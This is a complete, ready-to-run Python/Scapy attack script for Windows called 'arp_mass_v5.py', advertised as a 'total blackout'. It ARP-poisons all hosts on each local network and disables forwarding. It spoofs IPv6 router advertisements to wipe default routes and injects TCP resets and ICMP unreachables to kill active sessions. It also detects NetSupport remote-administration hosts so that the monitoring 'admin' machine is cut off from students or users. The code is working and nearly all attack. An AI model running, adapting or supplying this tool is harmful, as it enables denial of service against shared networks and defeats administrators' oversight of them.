#!/usr/bin/env python3
# arp_mass_v5.py — total blackout (IPv4 ARP + IPv6 RA/NDP + RST/ICMP kill)
# multi-interface, dedup, self-protect, brutal
#
# run:
#   1. Npcap (WinPcap API compatible mode) -> https://npcap.com/#download
#   2. pip install scapy
#   3. CMD / PowerShell as Administrator
#   4. python arp_mass_v5.py

from scapy.all import (
    conf, get_if_addr, get_if_hwaddr,
    Ether, ARP, IP, TCP, UDP, ICMP, IPv6,
    srp, sr, sendp, send, sniff, AsyncSniffer,
    ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6ND_RS, ICMPv6ND_NA
)
import ipaddress, sys, time, threading, ctypes, os, subprocess
try:
    import winreg
except ImportError:
    winreg = None

conf.verb = 0

POISON_INTERVAL  = 0.02   # super fast
RA_INTERVAL      = 0.1    # aggressive IPv6 kill
RESCAN_EVERY     = 30
NS_PORTS         = (5405, 5406)
GATEWAY_LAST_OCT = ("1", "254", "100", "253", "50", "10", "2")
SKIP_IFACE_KEYS  = ("loopback", "pseudo", "vmware", "virtualbox",
                    "hyper-v", "vethernet", "npcap loopback",
                    "tap-", "tun", "wsl", "teredo", "isatap")
CREATE_NO_WIN    = 0x08000000

GREEN, YELLOW, RED = "\033[92m", "\033[93m", "\033[91m"
CYAN, GRAY, BOLD, RESET = "\033[96m", "\033[90m", "\033[1m", "\033[0m"

def enable_ansi():
    if os.name == "nt":
        try:
            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def disable_routing():
    if winreg:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
        except Exception: pass
        base = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base, 0, winreg.KEY_READ) as k:
                i = 0
                while True:
                    try: guid = winreg.EnumKey(k, i)
                    except OSError: break
                    i += 1
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f"{base}\\{guid}", 0, winreg.KEY_SET_VALUE) as sk:
                            winreg.SetValueEx(sk, "Forwarding", 0, winreg.REG_DWORD, 0)
                    except Exception: pass
        except Exception: pass

    # Disable IPv6 forwarding globally
    try:
        subprocess.run(["netsh", "interface", "ipv6", "set", "global", "forwarding=disabled"],
                       capture_output=True, creationflags=CREATE_NO_WIN)
    except Exception: pass

def protect_self(gw_ip, gw_mac):
    mac_dash = gw_mac.replace(":", "-")
    try:
        subprocess.run(["arp", "-d", gw_ip], capture_output=True, creationflags=CREATE_NO_WIN)
        subprocess.run(["arp", "-s", gw_ip, mac_dash], capture_output=True, creationflags=CREATE_NO_WIN)
        print(f"{GREEN}[+] self-protect: {gw_ip} -> {gw_mac}{RESET}")
    except Exception: pass

def unprotect_self(gw_ip):
    try: subprocess.run(["arp", "-d", gw_ip], capture_output=True, creationflags=CREATE_NO_WIN)
    except Exception: pass

def int_to_ip(n): return str(ipaddress.IPv4Address(n))
def int_to_mask(m): return str(ipaddress.IPv4Address(m))

def get_gateway_for(iface_name):
    for route in conf.route.routes:
        try:
            net, mask, gw, iface, _a, _m = route
        except Exception: continue
        if net == 0 and mask == 0 and iface == iface_name and gw not in ("0.0.0.0", None):
            return gw
    return None

def probe_gateway(iface, network):
    base = str(network.network_address).rsplit(".", 1)[0]
    for last in GATEWAY_LAST_OCT:
        cand = f"{base}.{last}"
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cand),
                         timeout=0.5, iface=iface, verbose=False)
            if ans: return cand
        except Exception: pass
    return None

def collect_ifaces():
    iface_data = {}
    for route in conf.route.routes:
        try:
            net, mask, gw, iface, _a, _m = route
        except Exception: continue
        if gw != "0.0.0.0" or not iface: continue
        if any(k in iface.lower() for k in SKIP_IFACE_KEYS): continue
        try:
            network = ipaddress.IPv4Network(f"{int_to_ip(net)}/{int_to_mask(mask)}", strict=False)
        except Exception: continue
        if network.prefixlen >= 31: continue
        if iface not in iface_data:
            try:
                my_ip = get_if_addr(iface)
                my_mac = get_if_hwaddr(iface)
            except Exception: continue
            if not my_ip or my_ip == "0.0.0.0" or not my_mac or my_mac.lower() == "00:00:00:00:00:00": continue
            iface_data[iface] = {"name": iface, "ip": my_ip, "mac": my_mac, "networks": [], "gateway": None}
        iface_data[iface]["networks"].append(network)

    result = []
    for name, d in iface_data.items():
        gw_ip = get_gateway_for(name) or probe_gateway(name, d["networks"][0])
        if not gw_ip: continue
        uniq, seen = [], set()
        for n in d["networks"]:
            k = f"{n.network_address}/{n.prefixlen}"
            if k in seen: continue
            seen.add(k)
            if n.num_addresses > 1024: n = ipaddress.IPv4Network(f"{d['ip']}/22", strict=False)
            uniq.append(n)
        d["networks"] = uniq
        d["gateway"] = gw_ip
        result.append(d)
    return result

def arp_resolve(iface, ip, timeout=2):
    if not ip: return None
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, iface=iface, verbose=False)
        for _, rcv in ans: return rcv[ARP].hwsrc
    except Exception: return None
    return None

def arp_scan_active(iface, network, my_ip, timeout=3):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network)),
                     timeout=timeout, iface=iface, inter=0.002, verbose=False)
    except Exception: return []
    return [{"ip": r[ARP].psrc, "mac": r[ARP].hwsrc} for _, r in ans if r[ARP].psrc != my_ip]

def arp_scan_passive(iface, my_ip, duration=3):
    found = {}
    def h(pkt):
        if pkt.haslayer(ARP):
            src, mac = pkt[ARP].psrc, pkt[ARP].hwsrc
            if src and mac and src != my_ip and mac.lower() != "00:00:00:00:00:00":
                found[src] = mac
    try: sniff(iface=iface, prn=h, store=False, timeout=duration, filter="arp")
    except Exception: pass
    return [{"ip": ip, "mac": mac} for ip, mac in found.items()]

def merge_targets(a, b):
    seen = {t["ip"] for t in a}
    for t in b:
        if t["ip"] not in seen:
            a.append(t)
            seen.add(t["ip"])
    return a

def sniff_netsupport(iface, my_ip, duration=5):
    found = set()
    def h(pkt):
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            t = pkt[TCP]
            if t.dport in NS_PORTS or t.sport in NS_PORTS:
                if pkt[IP].src != my_ip: found.add(pkt[IP].src)
                if pkt[IP].dst != my_ip: found.add(pkt[IP].dst)
    try: sniff(iface=iface, prn=h, store=False, timeout=duration, filter="tcp and (port 5405 or port 5406)")
    except Exception: pass
    return found

def probe_netsupport(iface, targets, timeout=2):
    if not targets: return []
    pkts = [IP(dst=ip) / TCP(dport=p, flags="S") for ip in targets for p in NS_PORTS]
    try:
        ans, _ = sr(pkts, timeout=timeout, iface=iface, verbose=False, inter=0.005)
        return list({rcv[IP].src for _, rcv in ans if rcv.haslayer(TCP) and (rcv[TCP].flags & 0x12) == 0x12})
    except Exception: return []

# ── packet builder ───────────────────────────────────────────────────────────
def build_poison(plan):
    info = plan["info"]
    targets = plan["targets"]
    gw_mac = plan["gw_mac"]
    admin = plan["admin"]
    my_mac = info["mac"]
    gw_ip = info["gateway"]

    pkts = []
    # 1. Gratuitous ARP (broadcast) reply
    pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gw_ip, pdst=gw_ip, hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff"))
    
    # 2. Unicast ARP to targets
    for t in targets:
        # Force update via request
        pkts.append(Ether(dst=t["mac"]) / ARP(op=1, psrc=gw_ip, pdst=t["ip"], hwsrc=my_mac))
        # Reply
        pkts.append(Ether(dst=t["mac"]) / ARP(op=2, psrc=gw_ip, pdst=t["ip"], hwsrc=my_mac, hwdst=t["mac"]))
        # Gateway side poison
        pkts.append(Ether(dst=gw_mac) / ARP(op=2, psrc=t["ip"], pdst=gw_ip, hwsrc=my_mac, hwdst=gw_mac))
        
    # 3. Admin isolation
    if admin:
        for t in targets:
            pkts.append(Ether(dst=t["mac"]) / ARP(op=1, psrc=admin["ip"], pdst=t["ip"], hwsrc=my_mac))
            pkts.append(Ether(dst=t["mac"]) / ARP(op=2, psrc=admin["ip"], pdst=t["ip"], hwsrc=my_mac, hwdst=t["mac"]))
            pkts.append(Ether(dst=admin["mac"]) / ARP(op=1, psrc=t["ip"], pdst=admin["ip"], hwsrc=my_mac))
            pkts.append(Ether(dst=admin["mac"]) / ARP(op=2, psrc=t["ip"], pdst=admin["ip"], hwsrc=my_mac, hwdst=admin["mac"]))
        # Admin to gateway
        pkts.append(Ether(dst=admin["mac"]) / ARP(op=1, psrc=gw_ip, pdst=admin["ip"], hwsrc=my_mac))
        pkts.append(Ether(dst=admin["mac"]) / ARP(op=2, psrc=gw_ip, pdst=admin["ip"], hwsrc=my_mac, hwdst=admin["mac"]))
        pkts.append(Ether(dst=gw_mac) / ARP(op=2, psrc=admin["ip"], pdst=gw_ip, hwsrc=my_mac, hwdst=gw_mac))
        
    return pkts

# ── workers ──────────────────────────────────────────────────────────────────
def poison_worker(plan, stop_event, stats):
    iface = plan["info"]["name"]
    while not stop_event.is_set():
        pkts = build_poison(plan)
        if pkts:
            try:
                sendp(pkts, iface=iface, verbose=False, inter=0.0001)
                with stats["lock"]: stats["pkts"] += len(pkts)
            except Exception: pass
        stop_event.wait(POISON_INTERVAL)

def ipv6_killer_worker(plan, stop_event):
    iface = plan["info"]["name"]
    gw_mac = plan["gw_mac"]
    my_mac = plan["info"]["mac"]
    
    # Spoof the real gateway's MAC and send RA with lifetime 0
    # This tells all IPv6 hosts to drop their default route instantly
    ra_pkt = (
        Ether(src=gw_mac, dst="33:33:00:00:00:01") /
        IPv6(src="fe80::1", dst="ff02::1", hlim=255) /
        ICMPv6ND_RA(chlim=0, routerlifetime=0, M=0, O=0) /
        ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
    )
    while not stop_event.is_set():
        try: sendp(ra_pkt, iface=iface, verbose=False)
        except Exception: pass
        stop_event.wait(RA_INTERVAL)

def rst_killer_worker(plan, stop_event, stats):
    """RST/IPv6 kill for active sessions bypassing poison"""
    iface = plan["info"]["name"]
    gw_ip = plan["info"]["gateway"]
    my_ip = plan["info"]["ip"]
    target_ips = {t["ip"] for t in plan["targets"]}
    if plan["admin"]: target_ips.add(plan["admin"]["ip"])
    
    # Add gateway and admin
    kill_peers = {gw_ip}
    if plan["admin"]: kill_peers.add(plan["admin"]["ip"])

    def h(pkt):
        # IPv4 TCP/UDP
        if pkt.haslayer(IP):
            ip = pkt[IP]
            if ip.src == my_ip or ip.dst == my_ip: return
            src_t, dst_t = ip.src in target_ips, ip.dst in target_ips
            src_p, dst_p = ip.src in kill_peers, ip.dst in kill_peers
            
            if not ((src_t and dst_p) or (src_p and dst_t)): return
            
            if pkt.haslayer(TCP):
                t = pkt[TCP]
                if t.flags & 0x04: return # RST already
                # Kill it
                if t.flags & 0x02:
                    rst = IP(src=ip.dst, dst=ip.src)/TCP(sport=t.dport, dport=t.sport, seq=0, ack=(t.seq+1)&0xFFFFFFFF, flags="RA")
                else:
                    rst = IP(src=ip.dst, dst=ip.src)/TCP(sport=t.dport, dport=t.sport, seq=t.ack, ack=(t.seq+len(bytes(t.payload)))&0xFFFFFFFF, flags="RA")
                send(rst, iface=iface, verbose=False)
                with stats["lock"]: stats["rsts"] += 1
            elif pkt.haslayer(UDP):
                u = pkt[UDP]
                icmp = IP(src=ip.dst, dst=ip.src)/ICMP(type=3, code=3)/IP(src=ip.src, dst=ip.dst)/UDP(sport=u.dport, dport=u.sport)
                send(icmp, iface=iface, verbose=False)
                with stats["lock"]: stats["rsts"] += 1

    holder = {"sn": None}
    def start():
        try:
            sn = AsyncSniffer(iface=iface, prn=h, store=False, promisc=True)
            sn.start()
            holder["sn"] = sn
            return True
        except Exception: return False

    if not start(): return
    while not stop_event.wait(5):
        if holder.get("sn") is None or not getattr(holder["sn"], "running", False):
            start()
    if holder.get("sn"):
        try: holder["sn"].stop()
        except Exception: pass

def arp_defender(plan, stop_event):
    # Keep as is, intercept ARP requests
    iface = plan["info"]["name"]
    my_mac = plan["info"]["mac"]
    gw_ip = plan["info"]["gateway"]
    gw_mac = plan["gw_mac"]
    targets = {t["ip"]: t["mac"] for t in plan["targets"]}
    if plan["admin"]: targets[plan["admin"]["ip"]] = plan["admin"]["mac"]

    def h(pkt):
        if not pkt.haslayer(ARP): return
        arp = pkt[ARP]
        if arp.hwsrc.lower() == gw_mac.lower() and arp.pdst in targets:
            sendp(Ether(dst=targets[arp.pdst])/ARP(op=2, psrc=gw_ip, pdst=arp.pdst, hwsrc=my_mac, hwdst=targets[arp.pdst]), iface=iface, verbose=False)
        if arp.op == 1 and arp.pdst == gw_ip and arp.psrc in targets:
            sendp(Ether(dst=arp.hwsrc)/ARP(op=2, psrc=gw_ip, pdst=arp.psrc, hwsrc=my_mac, hwdst=arp.hwsrc), iface=iface, verbose=False)
        if arp.op == 1 and arp.hwsrc.lower() == gw_mac.lower() and arp.pdst in targets:
            sendp(Ether(dst=gw_mac)/ARP(op=2, psrc=arp.pdst, pdst=gw_ip, hwsrc=my_mac, hwdst=gw_mac), iface=iface, verbose=False)

    holder = {"sn": None}
    def start():
        try:
            sn = AsyncSniffer(iface=iface, prn=h, store=False, promisc=True, filter="arp")
            sn.start()
            holder["sn"] = sn
        except Exception: pass

    start()
    while not stop_event.wait(5):
        if holder.get("sn") is None or not getattr(holder["sn"], "running", False):
            start()
    if holder.get("sn"):
        try: holder["sn"].stop()
        except Exception: pass

def restore(plans):
    print(f"\n{YELLOW}[*] restoring arp caches (10 rounds)...{RESET}")
    for _ in range(10):
        for plan in plans:
            info = plan["info"]
            gw_ip = info["gateway"]
            gw_mac = plan["gw_mac"]
            pkts = []
            for t in plan["targets"]:
                pkts.append(Ether(dst=t["mac"])/ARP(op=2, psrc=gw_ip, hwsrc=gw_mac, pdst=t["ip"], hwdst=t["mac"]))
                pkts.append(Ether(dst=gw_mac)/ARP(op=2, psrc=t["ip"], hwsrc=t["mac"], pdst=gw_ip, hwdst=gw_mac))
                if plan["admin"]:
                    pkts.append(Ether(dst=t["mac"])/ARP(op=2, psrc=plan["admin"]["ip"], hwsrc=plan["admin"]["mac"], pdst=t["ip"], hwdst=t["mac"]))
            if pkts:
                try: sendp(pkts, iface=info["name"], verbose=False, inter=0.001)
                except Exception: pass
        time.sleep(0.2)
    for plan in plans:
        unprotect_self(plan["info"]["gateway"])
        try: send(IPv6(dst="ff02::2")/ICMPv6ND_RS(), iface=plan["info"]["name"], verbose=False)
        except Exception: pass

# ── main ─────────────────────────────────────────────────────────────────────
def main():
    enable_ansi()
    print(f"{CYAN}{BOLD}=== arp mass poison v5 (IPv4+IPv6 total blackout) ==={RESET}")
    if not is_admin():
        print(f"{RED}[!] run as Administrator{RESET}"); sys.exit(1)

    print(f"{YELLOW}[*] disabling ipv4/ipv6 forwarding...{RESET}")
    disable_routing()

    ifaces = collect_ifaces()
    if not ifaces:
        print(f"{RED}[!] no usable interfaces{RESET}"); sys.exit(1)

    print(f"{GREEN}[+] detected {len(ifaces)} interface(s):{RESET}")
    for s in ifaces:
        print(f"    - {s['name']} ip={s['ip']} gw={s['gateway']}")

    print(f"{YELLOW}[*] scanning & sniffing...{RESET}")
    init_results = {}
    def init_iface(info):
        gw_mac = arp_resolve(info["name"], info["gateway"])
        tgts = []
        for net in info["networks"]: tgts = merge_targets(tgts, arp_scan_active(info["name"], net, info["ip"]))
        tgts = merge_targets(tgts, arp_scan_passive(info["name"], info["ip"], 3))
        ns = sniff_netsupport(info["name"], info["ip"], 5)
        init_results[id(info)] = {"gw_mac": gw_mac, "targets": tgts, "ns_passive": ns}
    
    ts = [threading.Thread(target=init_iface, args=(s,)) for s in ifaces]
    for t in ts: t.start()
    for t in ts: t.join()

    plans = []
    for info in ifaces:
        r = init_results.get(id(info))
        if not r or not r["gw_mac"]: continue
        
        protect_self(info["gateway"], r["gw_mac"])
        admin = None
        admin_ip = next(iter(r["ns_passive"]), None)
        if admin_ip:
            am = arp_resolve(info["name"], admin_ip)
            if am: admin = {"ip": admin_ip, "mac": am}
        
        probe_ips = [t["ip"] for t in r["targets"] if t["ip"] != info["gateway"] and (not admin or t["ip"] != admin["ip"])]
        if probe_ips:
            hits = probe_netsupport(info["name"], probe_ips)
            if hits and not admin:
                am = arp_resolve(info["name"], hits[0])
                if am: admin = {"ip": hits[0], "mac": am}

        tgts = [t for t in r["targets"] if t["ip"] != info["gateway"] and (not admin or t["ip"] != admin["ip"])]
        plans.append({"info": info, "gw_mac": r["gw_mac"], "admin": admin, "targets": tgts})

    if not plans:
        print(f"{RED}[!] nothing to poison{RESET}"); sys.exit(1)

    stop_event = threading.Event()
    stats = {"pkts": 0, "rsts": 0, "lock": threading.Lock()}

    for plan in plans:
        threading.Thread(target=poison_worker, args=(plan, stop_event, stats), daemon=True).start()
        threading.Thread(target=ipv6_killer_worker, args=(plan, stop_event), daemon=True).start()
        threading.Thread(target=arp_defender, args=(plan, stop_event), daemon=True).start()
        threading.Thread(target=rst_killer_worker, args=(plan, stop_event, stats), daemon=True).start()

    print(f"\n{GREEN}{BOLD}[*] BLACKOUT ACTIVE — Ctrl+C to restore{RESET}")
    try:
        while True:
            with stats["lock"]:
                print(f"\r  pkt/s: {stats['pkts']}  |  kill/s: {stats['rsts']}   ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        time.sleep(0.5)
        restore(plans)
        print(f"\n{GREEN}[+] Network restored.{RESET}")

if __name__ == "__main__":
    main()
